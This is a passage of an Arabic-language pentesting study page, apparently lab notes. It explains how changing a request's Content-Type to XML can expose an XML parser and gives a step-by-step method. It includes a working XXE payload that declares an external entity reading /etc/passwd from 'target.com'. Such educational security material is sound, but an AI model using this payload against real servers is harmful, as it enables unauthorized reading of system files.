+<p>اطلع فوق في اللاب واضغط على زرار <strong>"Submit solution"</strong>.</p>
+</li>
+<li>
+<p>اعمل Paste للـ Hostname واضغط OK.</p>
+</li>
+</ol>
+<p><strong>مبروك!</strong> اللاب هيعلم معاك "Solved" وإنت كده طبقت واحد من أذكى تكنيكات الـ File Upload Bypasses اللي ممكن تقابلها في مسارك.</p>
+<hr />
+<h3 id="xxe-attacks-via-modified-content-type">XXE attacks via modified content type :</h3>
+<p>التكنيك ده بقى في عالم الـ Bug Bounty والـ Pentesting بنسميه <strong>"الاستغلال القائم على ذكاء السيرفر الزائد" (Content-Type Tampering)</strong>. ده واحد من أسهل وأقوى الطرق اللي بتكشفلك <strong>Hidden Attack Surface</strong> لأنك بتجبر السيرفر يشتغل بنظام هو مش معلن عنه في الظاهر!</p>
+<p>تعال نفصص الفكرة دي بالتفصيل الممل، عشان تفهم إيه اللي بيحصل في الكواليس وسر نجاح الخدعة دي.</p>
+<h3 id="framework">🧠 المشكلة في الكواليس: الـ Framework الكسول!</h3>
+<p>لما المطور بييجي يبني موقع، بيستخدم مكتبات جاهزة (Web Frameworks) زي (Java Spring, Node.js Express, PHP, etc) عشان تستقبل البيانات وتتعامل معاها.</p>
+<p>في الحالات العادية، لما بتملأ فورم على الموقع وتدوس Send، المتصفح بيبعت الطلب بصيغة: <code>Content-Type: application/x-www-form-urlencoded</code> والبيانات بتروح كالتالي: <code>foo=bar</code></p>
+<p>المطور وهو بيكتب الكود، بيكتب سطر زي ده مثلاً: <code>$data = $request-&gt;getBody();</code> من غير ما يحدد إن السيرفر <strong>لازم</strong> يستقبل <code>urlencoded</code> بس!</p>
+<p>هنا بقى بيحصل "الذكاء الزائد" من الـ Framework؛ الـ Framework المدمج في الخلفية بيبقى جواه ميزة اسمها <strong>Automated Body Parsing</strong>. الميزة دي بتقول: <em>"أنا هبص على الـ Content-Type الـ مبعوتلي، لو لقيت المستخدم قايلي إنه باعت XML، أنا هحول نفسي تلقائياً لـ XML Parser وأقرا الكلام!"</em>.</p>
+<h3 id="the-transformation">🪓 إزاي الهاكر بيعمل الخدعة دي؟ (The Transformation)</h3>
+<p>تخيل إنك لقيت طلب رايح للسيرفر بالشكل الطبيعي ده:</p>
+<p>HTTP</p>
+<pre><code>POST /action HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+
+user=marwan&amp;age=23
+</code></pre>
+<p>إنت كـ Pentester ذكي، هتاخد الطلب ده على الـ <strong>Burp Repeater</strong> وتعمل الآتي:</p>
+<ol>
+<li>
+<p><strong>تغيير الهوية (Content-Type):</strong> هتحذف <code>application/x-www-form-urlencoded</code> وتكتب مكانها <code>text/xml</code> أو <code>application/xml</code>.</p>
+</li>
+<li>
+<p><strong>إعادة صياغة البيانات (Reformatting):</strong> هتحول البارامترات العادية لتاجات XML بنفس الأسماء:</p>
+</li>
+</ol>
+<p>XML</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;user&gt;marwan&lt;/user&gt;
+&lt;age&gt;23&lt;/age&gt;
+</code></pre>
+<h4 id="_14">⚖️ النتيجة المحتملة:</h4>
+<ul>
+<li>
+<p><strong>سيناريو أ (السيرفر مؤمن):</strong> هيرد عليك بـ <code>415 Unsupported Media Type</code> أو <code>400 Bad Request</code>؛ يعني بيقولك أنا مابفهمش غير فورم.</p>
+</li>
+<li>
+<p><strong>سيناريو ب (السيرفر مصاب بالثغرة المخفية):</strong> السيرفر هيعالج الطلب عادي جداً ويرد عليك بـ <code>200 OK</code> وكأن مفيش حاجة حصلت! ده معناه إن الـ XML Parser الداخلي <strong>اشتغل وقرأ الداتا</strong>.</p>
+</li>
+</ul>
+<h3 id="exploitation">💣 مرحلة الـ Exploitation (تدمير السيرفر)</h3>
+<p>بمجرد ما تلاقي السيرفر وافق على تحويل الـ Content-Type لـ XML، إنت كده فتحت الباب المغلق. هتروح علطول حاقن الـ XXE Payload التقليدي في أول الملف بالشكل ده:</p>
+<p>HTTP</p>
+<pre><code>POST /action HTTP/1.1
+Host: target.com
+Content-Type: text/xml
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
+&lt;user&gt;&amp;xxe;&lt;/user&gt;
+&lt;age&gt;23&lt;/age&gt;
+</code></pre>
+<p>السيرفر هيقرأ الـ XML، يشوف الـ <code>DOCTYPE</code> الخبيث، ينفذه، ويرجعلك ملف الباسوردات!</p>
+<h3 id="obsidian">📝 كشكول الـ Obsidian (ملخص الحل الجاهز لـ نوتس بتاعتك)</h3>
+<p><strong>اسم التكنيك:</strong> XXE via Content-Type Modification <strong>الفكرة الأساسية:</strong> استغلال عدم قيام المطور بتقييد (Restrict) نوع البيانات المدخلة، والاعتماد على الـ Framework الذي يقوم بتحويل صيغة المعالجة تلقائياً إلى XML بمجرد تغيير الـ Header.</p>
+<p><strong>خطوات الفحص عملياً (Methodology):</strong></p>
+<ol>
+<li>
+<p>ارسل الطلب الطبيعي إلى <strong>Burp Repeater</strong>.</p>
+</li>
+<li>
+<p>غير الـ <code>Content-Type</code> من <code>application/x-www-form-urlencoded</code> إلى <code>text/xml</code>.</p>
+</li>
+<li>
+<p>حوّل الـ Body من <code>key=value</code> إلى <code>&lt;key&gt;value&lt;/key&gt;</code>.</p>
+</li>
+<li>
+<p>إذا استجاب السيرفر بشكل طبيعي (200 OK)، قم بحقن الـ <code>&lt;!DOCTYPE&gt;</code> الخبيث واستخرج الملفات.</p>
+</li>
+</ol>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": [], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u062a\u0645 \u0627\u0644\u0646\u0633\u062e \u0627\u0644\u0649 \u0627\u0644\u062d\u0627\u0641\u0638\u0629", "clipboard.copy": "\u0646\u0633\u062e \u0625\u0644\u0649 \u0627\u0644\u062d\u0627\u0641\u0638\u0629", "search.result.more.one": "\u0623\u0643\u062b\u0631 \u0645\u0646 1 \u0641\u064a \u0647\u0630\u0647 \u0627\u0644\u0635\u0641\u062d\u0629", "search.result.more.other": "\u0623\u0643\u062b\u0631 \u0645\u0646 # \u0641\u064a \u0647\u0630\u0647 \u0627\u0644\u0635\u0641\u062d\u0629", "search.result.none": "\u0644\u0627 \u062a\u0648\u062c\u062f \u0646\u062a\u0627\u0626\u062c", "search.result.one": "\u0646\u062a\u0627\u0626\u062c \u0627\u0644\u0628\u062d\u062b \u0645\u0633\u062a\u0646\u062f \u0648\u0627\u062d\u062f", "search.result.other": "\u0646\u062a\u0627\u0626\u062c \u0627\u0644\u0628\u062d\u062b # \u0645\u0633\u062a\u0646\u062f\u0627\u062a", "search.result.placeholder": "\u0627\u0643\u062a\u0628 \u0644\u0628\u062f\u0621 \u0627\u0644\u0628\u062d\u062b", "search.result.term.missing": "\u0645\u0641\u0642\u0648\u062f", "select.version": "\u0625\u062e\u062a\u0631 \u0627\u0644\u0625\u0635\u062f\u0627\u0631"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
